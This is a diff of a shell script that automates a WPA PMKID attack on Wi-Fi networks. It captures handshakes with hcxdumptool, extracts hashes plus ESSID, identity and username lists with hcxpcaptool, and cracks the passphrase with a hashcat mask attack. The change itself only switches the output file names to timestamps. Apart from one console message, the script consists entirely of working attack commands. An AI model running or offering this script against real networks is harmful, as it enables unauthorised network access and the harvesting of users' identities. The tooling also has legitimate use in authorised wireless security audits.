@@ -62,19 +62,21 @@ sudo rfkill unblock all
 sudo ip link set $my_interface up
 
 # clear existing pcap if found
-if [ ! -f "out/new.pcapng" ]; then rm -f out/new.pcapng; fi
+#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
+
+timestamp=$(date +%s)
 
 # run hcxdumptool to capture traffic, build a pcap
 echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
 cd out
 # TODO create filterlist 
 #sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
-sudo ../bin/hcxdumptool -o new.pcapng -i $my_interface --enable_status=1
-../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z new.16800 new.pcapng
+sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
+../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
 
 echo "** using hashcat to try and get the WPA PSK **"
-../bin/hashcat -m 16800 new.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
 
-# or ./bin/hashcat-legacy new.pcapng -a 3 '?l?l?l?l?l?lt!'
+# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
 
 exit 0
